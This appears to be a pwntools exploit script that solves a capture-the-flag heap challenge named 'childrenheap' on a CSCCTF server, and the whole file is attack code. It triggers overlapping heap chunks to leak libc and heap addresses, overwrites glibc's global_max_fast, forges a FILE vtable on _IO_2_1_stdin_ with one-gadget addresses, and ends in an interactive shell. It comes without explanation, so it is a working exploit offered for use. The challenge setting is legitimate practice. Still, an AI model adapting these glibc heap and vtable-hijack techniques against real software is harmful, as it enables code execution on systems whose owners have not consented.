#!/usr/bin/python

from pwn import *

def allocate(idx,size,payload):
	r.sendlineafter(">> ",'1')
	r.sendlineafter("Index: ",str(idx))
	r.sendlineafter("Size: ",str(size))
	r.sendafter("Content: ",payload)

def update(idx,payload):
	r.sendlineafter(">> ",'2')
	r.sendlineafter("Index: ",str(idx))
	r.sendafter("Content: ",payload)

def show(idx):
	r.sendlineafter(">> ",'3')
	r.sendlineafter("Index: ",str(idx))
	r.recvuntil("content: ")
	return r.recvline(False)

def delete(idx):
	r.sendlineafter(">> ",'4')
	r.sendlineafter("Index: ",str(idx))

def exploit():
	allocate(0,0xf8,'?'*8)
	allocate(1,0x68,'?'*8)
	allocate(2,0x68,'?'*8)
	allocate(3,0xf8,'?'*8)
	allocate(4,0x48,'?'*8)
	allocate(5,0x68,'?'*8)
	allocate(6,0x10,'?'*8)

	delete(0)
	payload = '?'*8
	payload = payload.ljust(0x60,'\x00')
	payload += p64(0x100+0x70+0x70)
	update(2,payload)
	delete(3)

	allocate(0,0xf8,'?'*8)
	libc_leak = u64((show(1)).ljust(8,'\x00'))
	libc.address = libc_leak-0x3c4b78
	target = libc.symbols["_IO_2_1_stdin_"]
	log.info("libc leak: {}".format(hex(libc_leak)))
	log.info("libc base: {}".format(hex(libc.address)))
	log.info("_IO_2_1_stdin_: {}".format(hex(target)))

	allocate(7,0x68,'?'*8)
	allocate(8,0x68,'?'*8)
	allocate(9,0xf8,'?'*8)
	delete(7)

	payload = p64(libc.address+0xf02a4)*(0xf0/8)
	update(9,payload)

	payload = p64(0)
	payload += p64(libc.address+0x3c67f8-0x10) # global_max_fast
	update(1,payload)
	allocate(7,0x68,'?'*8)

	delete(2)
	delete(5)
	delete(8)
	delete(7)

	heap_leak = u64(show(1).ljust(8,'\x00'))
	fake_vtable = heap_leak+0x80
	log.info("fake vtable: {}".format(hex(fake_vtable)))

	allocate(10,0x68,'?'*8)
	allocate(11,0x68,p64(target+0xa0-0x3))
	allocate(12,0x68,'?'*8)
	allocate(13,0x68,'?'*8)

	payload = '\x00'*3
	payload += p64(0)*2
	payload += p64(0xffffffff)
	payload += p64(0)*2
	payload += p64(fake_vtable)
	allocate(14,0x68,payload)

	r.interactive()

# context.terminal = ["tmux","new-window","-c","/tmp"]
exe = ELF("./childrenheap")
libc = ELF("./libc-2.23.so",checksec=False)

a = lambda: gdb.attach(r,"""
	pie break *0xd48
	pie break *0xfc3
	# b *_int_malloc
	c
""") if len(sys.argv) < 2 else False

if len(sys.argv) < 2:
	r = process(["./ld-2.23.so",exe.path],env={"LD_PRELOAD":libc.path})
else:
	r = remote("childrenheap.problem.cscctf.com",10002)

exploit()
